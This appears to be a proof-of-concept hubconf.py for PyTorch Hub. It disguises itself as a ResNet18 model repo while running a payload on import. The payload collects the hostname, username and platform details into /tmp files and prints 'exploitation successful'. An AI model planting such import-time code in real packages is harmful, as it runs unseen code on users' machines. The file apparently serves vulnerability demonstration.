import os
import sys
import socket
import platform
import json
import datetime
from pathlib import Path

# Define dependencies so the code looks legitimate
dependencies = ['torch']

# Import your model.py to make it look like a legitimate model repo
from .model import SimpleModel

# Function that will be called when someone uses torch.hub.load
def resnet18(pretrained=False, **kwargs):
    """
    Simple ResNet18 model
    pretrained (bool): load pretrained weights
    """
    # This legitimate function will be what shows up in API docs
    model = SimpleModel()
    return model

# The malicious payload that executes as soon as hubconf.py is imported
def _collect_system_info():
    """Collect non-sensitive system information for demonstration purposes."""
    info = {
        "timestamp": datetime.datetime.now().isoformat(),
        "python_version": sys.version,
        "platform": platform.platform(),
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "cpu_count": os.cpu_count(),
        "cwd": os.getcwd(),
    }
    return info

def _write_evidence_file():
    """Create a file in /tmp with system information."""
    info = _collect_system_info()
    
    # Create evidence file with collected data
    evidence_file = "/tmp/torch_hub_vulnerability_proof.json"
    with open(evidence_file, "w") as f:
        json.dump(info, f, indent=2)
    
    # Create a simple flag file for quick verification
    Path("/tmp/torch_hub_compromised").touch()
    
    print("PyTorch Hub exploitation successful")

# This code runs immediately when hubconf.py is imported
_write_evidence_file()